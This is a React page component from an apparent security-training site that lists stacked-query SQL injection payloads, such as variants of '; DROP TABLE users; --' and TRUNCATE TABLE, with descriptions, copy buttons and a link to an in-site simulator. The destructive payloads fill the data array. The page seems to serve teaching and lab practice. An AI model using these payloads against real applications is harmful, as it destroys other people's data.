import React, { useState } from 'react';
import { Link } from 'react-router-dom';
import { ArrowLeft, Trash2, Copy, Check, Search } from 'lucide-react';

const payloadSections = [
  {
    id: 'drop-table-standard',
    title: 'Drop Table (Standard)',
    description: 'Stacked query injections use a semicolon separator (;) to run additional SQL commands after the primary query. Standard table drops delete the specified database tables completely, removing their structure and all stored rows.',
    payloads: [
      { code: "'; DROP TABLE users; -- ", desc: "Terminates the primary query, then executes a separate query to delete the 'users' table.", tags: ['Drop Table', 'Semicolon'] },
      { code: "admin'; DROP TABLE users; -- ", desc: 'Drop table query injected next to the admin username target query.', tags: ['Drop Table', 'Targeted'] },
      { code: "'); DROP TABLE users; -- ", desc: 'Escapes a parenthesized parameter boundary, followed by the table deletion command.', tags: ['Drop Table', 'Parenthesis'] },
      { code: "1'; DROP TABLE users; -- ", desc: 'Numeric breakout attempting to drop the users table.', tags: ['Drop Table', 'Numeric'] },
      { code: "'; DROP TABLE users;#", desc: 'MySQL style drop table statement terminated with a hash comment.', tags: ['Drop Table', 'MySQL'] },
      { code: "admin'; DROP TABLE users;#", desc: 'Targeted MySQL style drop table statement targeting the admin filter.', tags: ['Drop Table', 'MySQL'] },
      { code: "admin' ; DROP TABLE users -- ", desc: 'Standard stacked query deletion with varying whitespace spacing around semicolons.', tags: ['Drop Table', 'Whitespace'] }
    ]
  },
  {
    id: 'conditional-drops',
    title: 'Conditional Drops',
    description: 'These payloads verify database tables by conditionally testing their existence. The query checks if the table exists before attempting deletion, which prevents the SQL execution from generating visible database exceptions.',
    payloads: [
      { code: "'; DROP TABLE IF EXISTS users; -- ", desc: "Safely runs deletion check so the query doesn't crash if the table was already deleted.", tags: ['Drop Table', 'Conditional'] },
      { code: "'); DROP TABLE IF EXISTS users; -- ", desc: 'Escapes parenthesized queries before invoking conditional table deletion check.', tags: ['Drop Table', 'Parenthesis'] }
    ]
  },
  {
    id: 'logical-stacked',
    title: 'Logical Stacked Queries',
    description: 'These payloads combine logical tautology checks with destructive commands. If the login or user check succeeds, the subsequent stacked query executes immediately.',
    payloads: [
      { code: "1=1; DROP TABLE users; -- ", desc: 'Appends the drop table query after a true integer evaluation.', tags: ['Stacked', 'Tautology'] },
      { code: "' OR 1=1; DROP TABLE users; -- ", desc: 'Appends the stacked deletion query after a string tautology expression.', tags: ['Stacked', 'Tautology'] }
    ]
  },
  {
    id: 'truncate-table',
    title: 'Truncate Table',
    description: 'Truncate statements remove all records and rows from a database table immediately, resetting table indexes while keeping the original table columns, types, and schema structure intact.',
    payloads: [
      { code: "'; TRUNCATE TABLE users; -- ", desc: "Completely empties all rows and data inside the 'users' table while keeping its structure.", tags: ['Truncate', 'Semicolon'] },
      { code: "admin'; TRUNCATE TABLE users; -- ", desc: 'Empties table contents targeting the admin filter parameters.', tags: ['Truncate', 'Targeted'] }
    ]
  }
];

export default function DropTableAttackPayloads() {
  const [copiedText, setCopiedText] = useState(null);
  const [searchTerm, setSearchTerm] = useState('');

  const allPayloads = [];
  payloadSections.forEach(section => {
    section.payloads.forEach(p => {
      allPayloads.push({
        ...p,
        sectionId: section.id,
        sectionTitle: section.title
      });
    });
  });

  const filteredPayloads = allPayloads.filter((p) => {
    const query = searchTerm.toLowerCase();
    return (
      p.code.toLowerCase().includes(query) ||
      p.desc.toLowerCase().includes(query) ||
      p.tags.some((t) => t.toLowerCase().includes(query))
    );
  });

  const handleCopy = (text) => {
    navigator.clipboard.writeText(text);
    setCopiedText(text);
    setTimeout(() => setCopiedText(null), 2000);
  };

  return (
    <div className="space-y-10 select-none w-full max-w-5xl mx-auto">
      {/* Back Link */}
      <div className="flex items-center justify-between">
        <Link to="/payload-library" className="inline-flex items-center gap-2 text-xs font-mono text-cyber-dim hover:text-cyber-blue transition-colors">
          <ArrowLeft className="w-3.5 h-3.5" />
          back to payload library dashboard
        </Link>
        <span className="text-[10px] font-mono text-cyber-dim">MODULE: DESTRUCTIVE_STACK_v1.0</span>
      </div>

      {/* Header Info */}
      <div className="flex flex-col gap-2 border-b border-cyber-border/40 pb-6 w-full relative">
        <div className="absolute -top-4 right-0 w-24 h-24 bg-cyber-red/10 blur-[40px] rounded-full pointer-events-none" />
        <span className="text-xs font-mono font-bold text-cyber-red tracking-[4px] uppercase flex items-center gap-2">
          <Trash2 className="w-4.5 h-4.5 text-cyber-red" />
          MODULE 05 — STACKED & DESTRUCTIVE EXPLOITS
        </span>
        <h1 className="text-3xl font-extrabold text-cyber-title tracking-wide uppercase">
          Stacked Query <span className="text-cyber-red">Payloads</span>
        </h1>
        <p className="text-cyber-dim text-sm text-justify leading-relaxed">
          Stacked statements parsed via semicolon separators to run independent database queries, such as administrative table drops.
        </p>
      </div>

      {/* Interactive Search Bar */}
      <div className="relative w-full max-w-md">
        <Search className="absolute left-3.5 top-1/2 -translate-y-1/2 w-4 h-4 text-cyber-dim/60" />
        <input
          type="text"
          value={searchTerm}
          onChange={(e) => setSearchTerm(e.target.value)}
          placeholder="Search stacked query payloads..."
          className="w-full bg-cyber-input border border-cyber-border rounded-lg pl-10 pr-4 py-2.5 text-cyber-text placeholder-cyber-dim/40 focus:outline-none focus:border-cyber-red/40 focus:ring-1 focus:ring-cyber-red/20 transition-all text-xs font-mono"
        />
      </div>

      {/* Main Payload Grid Section */}
      <div className="space-y-6">
        <div className="bg-cyber-card border border-cyber-border rounded-xl overflow-hidden shadow-lg">
          <div className="grid grid-cols-12 gap-3 px-6 py-3 border-b border-cyber-border bg-cyber-pre text-[10px] font-mono font-bold text-cyber-dim tracking-wider uppercase">
            <div className="col-span-4">Payload (SQL Code)</div>
            <div className="col-span-5">Mechanism & Impact Description</div>
            <div className="col-span-2">Tags</div>
            <div className="col-span-1 text-right">Actions</div>
          </div>

          <div className="divide-y divide-cyber-border/40 font-mono text-sm">
            {filteredPayloads.length > 0 ? (
              filteredPayloads.map((payload, pIdx) => (
                <div
                  key={pIdx}
                  className="grid grid-cols-12 gap-3 px-6 py-4 items-center hover:bg-cyber-red/[0.02] transition-colors group"
                >
                  {/* Payload Code */}
                  <div className="col-span-4 select-text">
                    <code className="text-cyber-red-light font-bold bg-cyber-pre/80 px-2.5 py-1.5 rounded-lg border border-cyber-border/60 block overflow-x-auto whitespace-nowrap">
                      {payload.code}
                    </code>
                  </div>

                  {/* Description */}
                  <div className="col-span-5 text-xs text-cyber-text leading-relaxed select-text font-sans">
                    {payload.desc}
                  </div>

                  {/* Tags */}
                  <div className="col-span-2 flex flex-wrap gap-1">
                    {payload.tags.map((tag, tIdx) => (
                      <span
                        key={tIdx}
                        className="text-[9px] font-bold uppercase tracking-wider bg-cyber-red/10 border border-cyber-red/20 text-cyber-red-light px-1.5 py-0.2 rounded"
                      >
                        {tag}
                      </span>
                    ))}
                  </div>

                  {/* Actions */}
                  <div className="col-span-1 flex items-center justify-end gap-2">
                    <button
                      onClick={() => handleCopy(payload.code)}
                      className="p-1.5 rounded bg-cyber-pre border border-cyber-border hover:border-cyber-red hover:bg-cyber-red/5 text-cyber-dim hover:text-cyber-red-light transition-all cursor-pointer relative"
                      title="Copy payload to clipboard"
                    >
                      {copiedText === payload.code ? (
                        <Check className="w-3.5 h-3.5 text-cyber-green" />
                      ) : (
                        <Copy className="w-3.5 h-3.5" />
                      )}
                    </button>
                  </div>
                </div>
              ))
            ) : (
              <div className="px-6 py-12 text-center text-cyber-dim font-mono text-sm">
                No matching payloads found for "{searchTerm}"
              </div>
            )}
          </div>
        </div>
      </div>

      {/* Sandbox Redirection */}
      <div className="bg-cyber-card border border-cyber-border/70 rounded-2xl p-8 text-center space-y-5 shadow-2xl relative overflow-hidden">
        <span className="absolute top-0 left-0 right-0 h-[2px] bg-gradient-to-r from-transparent via-cyber-red to-transparent" />
        <h3 className="font-sans font-extrabold text-lg text-cyber-title tracking-wider uppercase">
          Simulate this in our Interactive Stacked Queries Environment!
        </h3>
        <p className="text-sm text-cyber-text text-justify leading-relaxed">
          Test these payloads inside our live Stacked Query Simulator to witness real-time semicolon parsing, transaction execution, and verify administrative database drop commands!
        </p>
        <div className="pt-2 flex justify-center">
          <Link
            to="/attacks/drop-table"
            className="inline-flex items-center justify-center gap-2 bg-cyber-red hover:bg-cyber-red-light text-white px-8 py-3.5 rounded-xl text-xs font-bold uppercase tracking-wider transition-all cursor-pointer shadow-[0_0_15px_rgba(239,68,68,0.3)] hover:shadow-[0_0_25px_rgba(239,68,68,0.5)] transform hover:-translate-y-0.5"
          >
            Launch Live Stacked Query Simulator
          </Link>
        </div>
      </div>
    </div>
  );
}
